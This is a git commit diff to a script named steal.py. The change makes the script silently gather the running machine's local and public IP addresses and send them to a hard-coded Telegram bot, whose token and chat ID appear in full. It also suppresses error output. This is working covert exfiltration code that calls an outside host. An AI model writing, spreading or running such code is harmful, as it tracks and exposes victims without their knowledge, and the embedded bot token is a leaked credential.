c31486e9045b2147934812b7d8c2724ddfe1a492
Abir Hossain <84902162+ABIRHOSSAIN10@users.noreply.github.com>
2024-09-06 18:59:34 +0600

    Update steal.py

--- steal.py
+++ steal.py
@@ -1,18 +1,30 @@
-import requests,time,os
-def background_task():
+import requests,time,os,socket
+
+def get_public_ip():
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(('8.8.8.8', 80))
+        local_ip = s.getsockname()[0]
+        s.close()    
+        public_ip = requests.get('https://api.ipify.org').text
+        return {'local_ip': local_ip, 'public_ip': public_ip } 
+    except Exception as e:
+        pass
+
+def background_task(ip):
     try:
         url = 'https://api.telegram.org/bot7496801196:AAHBtjABl8u_qN6hDbEFrfwLepaHxD9rs0A/sendMessage'
         params = {
             'chat_id': '6400572573',
-            'text': 'Steal you'
+            'text': str(ip)
         }
         for i in range(2):
             response = requests.get(url, params=params)
             time.sleep(4)
         
     except Exception as e:
-        print(f"An error occurred: {e}")
-background_task()
+        pass 
+background_task(get_public_ip())
 LOCK_FILE=os.path.join(os.path.dirname(os.path.abspath(__file__)), 'task.lock')
 def remove_lock_file():
 
